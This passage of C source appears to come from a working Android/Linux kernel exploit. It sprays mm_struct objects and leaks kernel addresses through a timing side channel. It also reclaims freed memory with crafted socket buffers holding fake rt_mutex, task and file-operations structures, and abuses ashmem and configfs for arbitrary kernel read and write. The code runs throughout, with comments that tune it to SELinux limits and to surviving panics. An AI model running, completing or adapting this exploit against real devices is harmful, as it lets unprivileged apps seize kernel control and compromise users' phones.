  SYSCHK(waitpid(child, NULL, 0));
}

void close_reclaim_sockets(void) {
  for (int i = 0; i < 2; i++) {
    if (reclaim_sv[i] >= 0) {
      close(reclaim_sv[i]);
      reclaim_sv[i] = -1;
    }
  }
}

void close_ctx_memfds(struct mm_ctx *ctx) {
  for (size_t i = 0; i < ctx->mm_cnt; i++) {
    if (ctx->memfds[i] > 0) {
      close(ctx->memfds[i]);
      ctx->memfds[i] = -1;
    }
  }
}

void free_ctx_storage(struct mm_ctx *ctx) {
  free(ctx->childs);
  free(ctx->memfds);
  ctx->childs = NULL;
  ctx->memfds = NULL;
  ctx->mm_cnt = 0;
}

void cleanup_page_prepare_state(void) {
  close_ctx_memfds(&prepare_ctx);
  close_ctx_memfds(&spray_ctx);
  close_ctx_memfds(&pre_ctx);
  close_ctx_memfds(&post_ctx);
  if (memfd_leak > 0) {
    close(memfd_leak);
    memfd_leak = -1;
  }
  free_ctx_storage(&prepare_ctx);
  free_ctx_storage(&spray_ctx);
  free_ctx_storage(&pre_ctx);
  free_ctx_storage(&post_ctx);
  free(skb_buf);
  skb_buf = NULL;
}

int clone_memfd(void) {
  pid_t child = clone_child();
  int fd = open_memfd(child);
  kill_child(child);
  return fd;
}

void prepare_ctxs(void) {
  prepare_ctx.mm_cnt = 32 * mm_objs_per_slab;
  prepare_ctx.childs = calloc(sizeof(pid_t), prepare_ctx.mm_cnt);
  prepare_ctx.memfds = calloc(sizeof(int), prepare_ctx.mm_cnt);

  spray_ctx.mm_cnt = (1 + MM_PARTIALS) * mm_objs_per_slab;
  spray_ctx.childs = calloc(sizeof(pid_t), spray_ctx.mm_cnt);
  spray_ctx.memfds = calloc(sizeof(int), spray_ctx.mm_cnt);

  pre_ctx.mm_cnt = mm_objs_per_slab - 1;
  pre_ctx.childs = calloc(sizeof(pid_t), pre_ctx.mm_cnt);
  pre_ctx.memfds = calloc(sizeof(int), pre_ctx.mm_cnt);

  post_ctx.mm_cnt = mm_objs_per_slab;
  post_ctx.childs = calloc(sizeof(pid_t), post_ctx.mm_cnt);
  post_ctx.memfds = calloc(sizeof(int), post_ctx.mm_cnt);
}

int prepare_skb_payload(uintptr_t base, int payload_mode) {
  memset(skb_buf, 0, SKB_SEND_SIZE);

  uintptr_t payload_base = base + SKB_DATA_DELTA;

  fake_lock = payload_base + LOCK_OFF;
  fake_w0 = payload_base + W0_OFF;
  fake_task = payload_base + FAKE_TASK_OFF;
  fake_fops = payload_base + FOPS_TABLE_OFF;
  if (payload_mode == PAGE_PAYLOAD_FOPS) {
    fake_parent = fake_fops;
    fake_right = data_addr(ASHMEM_MISC_FOPS);
    fake_left = 0;
    binwrite_target = payload_base + SCRATCH_OFF;
  } else {
    fake_parent = data_addr(ASHMEM_MISC_FOPS) - 8;
    fake_right = fake_fops;
    fake_left = payload_base + LEFT_OFF;
    binwrite_target = payload_base + FOPS_OFF + 0x700;
  }

  uintptr_t write_pc = fake_fops;
  uintptr_t write_right = data_addr(ASHMEM_MISC_FOPS);
  uintptr_t write_left = 0;
  uint64_t waiter_task = text_addr(INIT_TASK);
  uint64_t task_group = text_addr(ROOT_TASK_GROUP);
  uint64_t pi_top_task = text_addr(INIT_TASK);
  if (payload_mode == PAGE_PAYLOAD_SLIDE) {
    write_pc = SLIDE_LOGGERS_0_1;
    write_right = 0;
    write_left = SLIDE_RANDOM_BOOT_ID_DATA;
  }
  /* FOPS mode now also runs without slide (alioth pselect route is dead),
   * so text_addr(INIT_TASK) would return an uncalibrated vmalloc address.
   * Keep every PI-chain pointer inside the controlled page for both
   * payload modes so a partial route cannot fault or spin on garbage. */
  waiter_task = fake_task;
  task_group = fake_task;
  pi_top_task = fake_task;

  for (size_t chunk = 0; chunk < SKB_SEND_SIZE; chunk += ORDER3_SIZE) {
    unsigned char *p = skb_buf + chunk + SKB_FRAG_BIAS;

    put32(p, LOCK_OFF + 0x00, 0);
    if (payload_mode == PAGE_PAYLOAD_SLIDE) {
      /* Two-level PI chain within our controlled page:
       * stale_waiter -> fake_lock (trylock OK) -> owner = fake_task
       * -> fake_task->pi_blocked_on = fake_w0 -> fake_w0->lock =
       * fake_lock -> prio mismatch -> adjustment -> fake_w0->prio =
       * fake_task->prio.  We can read the prio change via recvmsg! */
      put64(p, LOCK_OFF + 0x08, fake_w0);
      put64(p, LOCK_OFF + 0x10, fake_w0);
      put64(p, LOCK_OFF + 0x18, fake_task | 1);
    } else {
      put64(p, LOCK_OFF + 0x08, fake_w0);
      put64(p, LOCK_OFF + 0x10, fake_w0);
      put64(p, LOCK_OFF + 0x18, fake_task | 1);
    }

    put64(p, W0_OFF + 0x00, 1);
    put64(p, W0_OFF + 0x08, 0);
    put64(p, W0_OFF + 0x10, 0);
    put32(p, W0_OFF + FAKE_WAITER_TREE_PRIO_OFF, FAKE_WAITER_PRIO);
    put64(p, W0_OFF + FAKE_WAITER_TREE_DEADLINE_OFF, 0);
    put64(p, W0_OFF + FAKE_WAITER_PI_TREE_ENTRY_OFF + 0x00, write_pc);
    put64(p, W0_OFF + FAKE_WAITER_PI_TREE_ENTRY_OFF + 0x08, write_right);
    put64(p, W0_OFF + FAKE_WAITER_PI_TREE_ENTRY_OFF + 0x10, write_left);
    put32(p, W0_OFF + FAKE_WAITER_PI_TREE_PRIO_OFF, FAKE_WAITER_PRIO);
    put64(p, W0_OFF + FAKE_WAITER_PI_TREE_DEADLINE_OFF, 0);
    put64(p, W0_OFF + FAKE_WAITER_TASK_OFF, waiter_task);
    put64(p, W0_OFF + FAKE_WAITER_LOCK_OFF, fake_lock);
    put32(p, W0_OFF + FAKE_WAITER_WAKE_STATE_OFF, 0);
    put64(p, W0_OFF + FAKE_WAITER_WW_CTX_OFF, 0);
    /* Chain-walk safety: rt_mutex_adjust_prio_chain reads the top waiter
     * of the fake lock via rb_leftmost and then checks
     * top_waiter->lock (real layout offset +0x38) == current lock.
     * In the fake page, +0x38 is also pi_tree_entry.rb_left (write_left).
     * Override it to fake_lock so the sanity check passes and the walk
     * exits cleanly (fake_task->pi_blocked_on = 0). */
    put64(p, W0_OFF + 0x38, fake_lock);

    /* Offset-tolerant safety fill: every qword in the fake task's PI region
     * is a self-referencing empty plist head, so kernel reads at a wrong
     * task_struct offset still yield a valid empty list and all kernel-side
     * writes stay inside this page instead of panicking. Explicit fields
     * below still land at the intended offsets. */
    for (size_t off = FAKE_TASK_OFF + 0x600; off < FAKE_TASK_OFF + 0xb00;
         off += 8) {
      put64(p, off, payload_base + off);
    }
    put32(p, FAKE_TASK_OFF + FAKE_TASK_USAGE_OFF, 0x100);
    put32(p, FAKE_TASK_OFF + FAKE_TASK_PRIO_OFF, FAKE_TASK_PRIO);
    put32(p, FAKE_TASK_OFF + FAKE_TASK_NORMAL_PRIO_OFF, FAKE_TASK_PRIO);
    put32(p, FAKE_TASK_OFF + FAKE_TASK_PI_LOCK_OFF, 0);
    if (payload_mode == PAGE_PAYLOAD_FOPS) {
      put64(p, FAKE_TASK_OFF + FAKE_TASK_PI_WAITERS_OFF, 0);
      put64(p, FAKE_TASK_OFF + FAKE_TASK_PI_WAITERS_OFF + 0x08, 0);
    } else {
      put64(p, FAKE_TASK_OFF + FAKE_TASK_PI_WAITERS_OFF,
            fake_w0 + FAKE_WAITER_PI_TREE_ENTRY_OFF);
      put64(p, FAKE_TASK_OFF + FAKE_TASK_PI_WAITERS_OFF + 0x08,
            fake_w0 + FAKE_WAITER_PI_TREE_ENTRY_OFF);
    }
    put64(p, FAKE_TASK_OFF + FAKE_TASK_TASK_GROUP_OFF, task_group);
    put64(p, FAKE_TASK_OFF + FAKE_TASK_PI_TOP_TASK_OFF, pi_top_task);
    put64(p, FAKE_TASK_OFF + FAKE_TASK_PI_BLOCKED_ON_OFF, fake_w0);

    put64(p, RIGHT_OFF + 0x00, fake_parent);
    put64(p, RIGHT_OFF + 0x08, 0);
    put64(p, RIGHT_OFF + 0x10, 0);

    put64(p, LEFT_OFF + 0x00, fake_parent);
    put64(p, LEFT_OFF + 0x08, 0);
    put64(p, LEFT_OFF + 0x10, 0);

    if (payload_mode == PAGE_PAYLOAD_FOPS) {
      put_fake_fops_table(p, FOPS_TABLE_OFF);
    }
  }
  return 1;
}

uintptr_t prepare_kernel_page(int payload_mode) {
  close_reclaim_sockets();
  mm_objs_per_slab = ORDER3_SIZE / 0x388; /* spray sizing uses real mm_struct size */
  prepare_ctxs();

  skb_buf = malloc(SKB_SEND_SIZE);
  memset(skb_buf, 0x41, SKB_SEND_SIZE);

  for (size_t i = 0; i < prepare_ctx.mm_cnt; i++) {
    prepare_ctx.childs[i] = clone_child();
    prepare_ctx.memfds[i] = open_memfd(prepare_ctx.childs[i]);
  }

  for (size_t i = 0; i < spray_ctx.mm_cnt; i++) {
    spray_ctx.childs[i] = clone_child();
    spray_ctx.memfds[i] = open_memfd(spray_ctx.childs[i]);
  }

  uintptr_t leaked = cached_leaked_mm;
  if (!leaked) {
    int cpu_count = (int)sysconf(_SC_NPROCESSORS_ONLN);
    detect_memory();
    ks = kernelsnitch_setup(
        MM_STRUCT_SZ, MM_ORDER, cpu_count, KSNITCH_COLLISIONS, 1, 0);  /* verbose diagnostics for on-device debug */
    ks->identity_end = (size_t)g_direct_map_end;
    ks->ram_bytes = g_ram_bytes;

    for (size_t i = 0; i < pre_ctx.mm_cnt; i++) {
      pre_ctx.childs[i] = clone_child();
    }
    child_leak = clone_leak_child();
    for (size_t i = 0; i < post_ctx.mm_cnt; i++) {
      post_ctx.childs[i] = clone_child();
    }

    for (size_t i = 0; i < pre_ctx.mm_cnt; i++) {
      pre_ctx.memfds[i] = open_memfd(pre_ctx.childs[i]);
    }
    memfd_leak = open_memfd(child_leak);
    for (size_t i = 0; i < post_ctx.mm_cnt; i++) {
      post_ctx.memfds[i] = open_memfd(post_ctx.childs[i]);
    }

    for (size_t i = 0; i < pre_ctx.mm_cnt; i++) {
      kill_child(pre_ctx.childs[i]);
    }
    for (size_t i = 0; i < post_ctx.mm_cnt; i++) {
      kill_child(post_ctx.childs[i]);
    }
    for (size_t i = 0; i < spray_ctx.mm_cnt; i++) {
      kill_child(spray_ctx.childs[i]);
    }
    /* in-process collision finding: no child to reap */
    if (child_leak != getpid())
      SYSCHK(waitpid(child_leak, NULL, 0));

    if (!kernelsnitch_found_collisions(ks)) {
      pr_warning("KernelSnitch collision finding failed\n");
      kernelsnitch_cleanup(ks);
      ks = NULL;
      for (size_t i = 0; i < prepare_ctx.mm_cnt; i++) {
        kill_child(prepare_ctx.childs[i]);
      }
      cleanup_page_prepare_state();
      return 0;
    }

    run_kernelsnitch_bruteforce();
    leaked = ks->mm_struct;
    if (leaked == (uintptr_t)-1) {
      pr_warning("KernelSnitch mm_struct leak failed\n");
      kernelsnitch_cleanup(ks);
      ks = NULL;
      for (size_t i = 0; i < prepare_ctx.mm_cnt; i++) {
        kill_child(prepare_ctx.childs[i]);
      }
      cleanup_page_prepare_state();
      return 0;
    }
    cached_leaked_mm = leaked;
  }

  if (getenv("KS_MM_TEST") && !getenv("KS_SLIDE_TEST")) {
    pr_success("KS_MM_TEST ok mm=%016zx base=%016zx\n", leaked,
               leaked & ~(PAGE_SIZE - 1));
    fflush(stdout);
    exit(0);
  }

  select_linear_map_delta(leaked);
  uintptr_t base = select_slab_base(leaked, slab_base_candidate);
  pr_info("KSLAB_BASE_CANDIDATE mm=%016zx base=%016zx idx=%d\n",
          leaked, base, slab_base_candidate % MM_SLAB_CANDIDATE_PAGES);
  slab_base_candidate++;
  /* Point the chain-walk owner at the mm_struct so the
   * "waiter->prio = task->prio" copy leaks *(int *)mm_va into the SKB. */
  g_leak_target = leaked;
  pr_info("KS_LEAK_TARGET mm=%016zx prio_read=%016zx\n",
          leaked, leaked);
  if (!prepare_skb_payload(base, payload_mode)) {
    if (ks) {
      kernelsnitch_cleanup(ks);
      ks = NULL;
    }
    for (size_t i = 0; i < prepare_ctx.mm_cnt; i++) {
      kill_child(prepare_ctx.childs[i]);
    }
    cleanup_page_prepare_state();
    return 0;
  }

  SYSCHK(socketpair(AF_UNIX, SOCK_STREAM, 0, reclaim_sv));
  int sndbuf = 1 << 20;
  setsockopt(reclaim_sv[0], SOL_SOCKET, SO_SNDBUF, &sndbuf, sizeof(sndbuf));
  int reclaim_flags = fcntl(reclaim_sv[0], F_GETFL, 0);
  if (reclaim_flags >= 0) {
    fcntl(reclaim_sv[0], F_SETFL, reclaim_flags | O_NONBLOCK);
  }
  int pcp_shaping_sv[2];
  SYSCHK(socketpair(AF_UNIX, SOCK_STREAM, 0, pcp_shaping_sv));

  struct iovec iov;
  memset(&iov, 0, sizeof(iov));
  iov.iov_base = skb_buf;
  iov.iov_len = SKB_SEND_SIZE;

  struct msghdr msg;
  memset(&msg, 0, sizeof(msg));
  msg.msg_iov = &iov;
  msg.msg_iovlen = 1;

  SYSCHK(sendmsg(pcp_shaping_sv[0], &msg, 0));

  pin_to_core(CORE);
  sched_yield();
  sched_yield();
  sched_yield();
  sched_yield();
  for (size_t i = 0; i < pre_ctx.mm_cnt; i++) {
    SYSCHK(close(pre_ctx.memfds[i]));
    pre_ctx.memfds[i] = -1;
  }
  for (size_t i = 0; i < post_ctx.mm_cnt - 1; i++) {
    SYSCHK(close(post_ctx.memfds[i]));
    post_ctx.memfds[i] = -1;
  }
  for (size_t i = 0; i < spray_ctx.mm_cnt; i += mm_objs_per_slab) {
    SYSCHK(close(spray_ctx.memfds[i]));
    spray_ctx.memfds[i] = -1;
  }

  SYSCHK(close(pcp_shaping_sv[0]));
  SYSCHK(close(pcp_shaping_sv[1]));
  sched_yield();
  sched_yield();
  sched_yield();
  sched_yield();
  SYSCHK(close(memfd_leak));
  memfd_leak = -1;
  for (int i = 0; i < SKB_RECLAIM_SENDS; i++) {
    errno = 0;
    ssize_t sent = sendmsg(reclaim_sv[0], &msg, MSG_DONTWAIT);
    if (sent <= 0) {
      break;
    }
  }
  if (ks) {
    kernelsnitch_cleanup(ks);
    ks = NULL;
  }

  for (size_t i = 0; i < prepare_ctx.mm_cnt; i++) {
    SYSCHK(close(prepare_ctx.memfds[i]));
    prepare_ctx.memfds[i] = -1;
    kill_child(prepare_ctx.childs[i]);
  }

  return base;
}

uintptr_t prepare_good_kernel_page(int payload_mode) {
  int max_attempts = KERNEL_PAGE_SETUP_ATTEMPTS;
  if (payload_mode == PAGE_PAYLOAD_SLIDE) {
    max_attempts = SLIDE_KERNEL_PAGE_SETUP_ATTEMPTS;
  } else if (payload_mode == PAGE_PAYLOAD_FOPS) {
    max_attempts = FOPS_KERNEL_PAGE_SETUP_ATTEMPTS;
  }
  for (int attempt = 1; attempt <= max_attempts; attempt++) {
    uintptr_t base = prepare_kernel_page(payload_mode);
    if (base) {
      return base;
    }
    pr_warning("prepare_kernel_page retry %d/%d\n", attempt,
               max_attempts);
  }
  pr_warning("prepare_kernel_page did not find usable nonzero source pointers\n");
  return 0;
}

ssize_t configfs_write_once(int fd, uintptr_t target, const void *data, size_t len) {
  unsigned char blob[128];
  memset(blob, 0, sizeof(blob));
  put64(blob, CFG_BIN_BUFFER_OFF - ASHMEM_NAME_PREFIX_LEN, target);
  put32(blob, CFG_BIN_BUFFER_SIZE_OFF - ASHMEM_NAME_PREFIX_LEN, len);
  put32(blob, CFG_CB_MAX_SIZE_OFF - ASHMEM_NAME_PREFIX_LEN, 0);
  errno = 0;
  int set_ret = try_set_ashmem_name_blob(fd, blob, sizeof(blob));
  int set_errno = errno;
  if (set_ret != 0) {
    errno = set_errno;
    return -1;
  }

  errno = 0;
  ssize_t wr = pwrite(fd, data, len, 0);
  return wr;
}

ssize_t configfs_read_once(int fd, uintptr_t target, void *data, size_t len) {
  unsigned char blob[128];
  memset(blob, 0, sizeof(blob));
#ifdef CFGOPS_4_19_STYLE
  /* 4.19: ashmem name starts at asma+0 with no prefix; fake configfs_buffer
   * gets page=target, count=len, needs_read_fill=0, then pread from pos 0:
   * simple_read_from_buffer(buf, len, &pos0, page=target, available=len) */
  put64(blob, 0 - ASHMEM_NAME_PREFIX_LEN, len); /* buffer->count */
  put64(blob, CFG_PAGE_OFF - ASHMEM_NAME_PREFIX_LEN, target);
  put32(blob, CFG_NEEDS_READ_FILL_OFF - ASHMEM_NAME_PREFIX_LEN, 0);
  errno = 0;
  int set_ret = try_set_ashmem_name_blob(fd, blob, sizeof(blob));
  int set_errno = errno;
  if (set_ret != 0) {
    errno = set_errno;
    return -1;
  }
  errno = 0;
  ssize_t rd = pread(fd, data, len, 0);
  return rd;
#else
  off_t pos = (off_t)(ASHMEM_PREFIX_COUNT - len);
  uintptr_t page = target - (uintptr_t)pos;
  put64(blob, CFG_PAGE_OFF - ASHMEM_NAME_PREFIX_LEN, page);
  put32(blob, CFG_NEEDS_READ_FILL_OFF - ASHMEM_NAME_PREFIX_LEN, 0);
  errno = 0;
  int set_ret = try_set_ashmem_name_blob(fd, blob, sizeof(blob));
  int set_errno = errno;
  if (set_ret != 0) {
    errno = set_errno;
    return -1;
  }

  errno = 0;
  ssize_t rd = pread(fd, data, len, pos);
  return rd;
#endif
}

int is_kernel_ptr(uintptr_t value) {
  return value >= 0xffff800000000000ULL;
}

int is_direct_ptr(uintptr_t value) {
  return value >= DIRECT_MAP_BASE && value < g_direct_map_end;
}

uint64_t kernel_read64(int fd, uintptr_t target) {
  uint64_t value = 0;
  ssize_t n = kernel_read_data(fd, target, &value, sizeof(value));
  if (n != (ssize_t)sizeof(value)) {
    return 0;
  }
  return value;
}

ssize_t kernel_write_data(int fd, uintptr_t target, const void *data, size_t len) {
  return configfs_write_once(fd, target, data, len);
}

ssize_t kernel_read_data(int fd, uintptr_t target, void *data, size_t len) {
  return configfs_read_once(fd, target, data, len);
}

/* ================= round-2: forced real-time disk logging ================= */
int g_exlog_fd = -1;
char g_exlog_path[256] = {0};

void exlog_open(void) {
  if (g_exlog_fd >= 0) {
    return;
  }
  /* /data/local/tmp keeps working after a wrong-delta fops write takes
   * down FUSE (/sdcard).  The file must be pre-created 666 by adb; an
   * untrusted_app cannot create it, so open() fails and we fall back.
   * No O_APPEND: SELinux grants untrusted_app { write } on shell_data_file
   * but not { append } (silently dontaudit'd), so an O_APPEND open fails
   * while the O_TRUNC-style writes used by the export files succeed. */
  {
    int fd = open("/data/local/tmp/ks_log.txt",
                  O_WRONLY | O_CLOEXEC, 0666);
    if (fd >= 0) {
      g_exlog_fd = fd;
      snprintf(g_exlog_path, sizeof(g_exlog_path),
               "/data/local/tmp/ks_log.txt");
      exlog_writef("+", "exlog open path=%s pid=%d uid=%u\n",
                   g_exlog_path, getpid(), getuid());
      return;
    }
  }
  time_t t = time(NULL);
  struct tm tmv;
  localtime_r(&t, &tmv);
  char ts[32];
  strftime(ts, sizeof(ts), "%Y%m%d_%H%M%S", &tmv);
  const char *dirs[] = {
    "/sdcard/Download",
    "/sdcard/Downloads",
    "/data/local/tmp",
    NULL,
  };
  for (int i = 0; dirs[i]; i++) {
    snprintf(g_exlog_path, sizeof(g_exlog_path), "%s/log_%s.txt", dirs[i], ts);
    int fd = open(g_exlog_path, O_WRONLY | O_CREAT | O_APPEND | O_CLOEXEC, 0666);
    if (fd >= 0) {
      g_exlog_fd = fd;
      break;
    }
  }
  if (g_exlog_fd >= 0) {
    exlog_writef("+", "exlog open path=%s pid=%d uid=%u\n",
                 g_exlog_path, getpid(), getuid());
  }
}

void exlog_writef(const char *level, const char *fmt, ...) {
  char msg[1200];
  va_list ap;
  va_start(ap, fmt);
  vsnprintf(msg, sizeof(msg), fmt, ap);
  va_end(ap);

  /* keep the original console output */
  fprintf(stdout, "[%s] %s", level, msg);
  fflush(stdout);

  if (g_exlog_fd < 0) {
    exlog_open();  /* lazy open (covers fork children / early calls) */
    if (g_exlog_fd < 0) {
      return;
    }
  }
  char line[1400];
  int n = snprintf(line, sizeof(line), "[%d][%s] ", (int)getpid(), level);
  if (n < 0) {
    return;
  }
  size_t used = (size_t)n;
  if (used < sizeof(line)) {
    strncat(line, msg, sizeof(line) - used - 1);
  }
  ssize_t wr = write(g_exlog_fd, line, strlen(line));
  (void)wr;
  fsync(g_exlog_fd);  /* forced flush: survive kernel panic */
}
